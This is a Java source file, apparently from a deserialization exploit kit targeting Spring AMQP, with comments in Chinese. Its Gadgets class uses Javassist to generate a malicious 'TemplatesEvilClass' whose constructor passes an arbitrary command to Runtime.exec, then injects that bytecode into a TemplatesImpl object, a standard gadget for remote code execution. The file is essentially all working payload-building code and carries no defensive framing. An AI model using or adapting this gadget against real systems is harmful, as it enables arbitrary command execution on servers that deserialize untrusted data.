package com.example.client;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

public class Gadgets {
    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();

        String body = String.format("{java.lang.Runtime.getRuntime().exec(\"%s\"); throw new org.springframework.amqp.AmqpRejectAndDontRequeueException(\"err\");}", command);

        // 利用 Javaassist 动态创建 TemplatesImpl 恶意类
        CtClass clazz = pool.makeClass("TemplatesEvilClass");

        // 设置 Super Class 为 AbstractTranslet
        CtClass superClazz =pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        // 创建无参 Constructor, 写入 Runtime.exec
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        // 将 Runtime.exec 直接写入 static 代码块
//        clazz.makeClassInitializer().setBody(body);

        Reflections.setFieldValue(templatesImpl, "_name", "Hello");
        Reflections.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        Reflections.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }

    public static byte[] getByteCode(Class clazz) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get(clazz.getName());
        return c.toBytecode();
    }
}
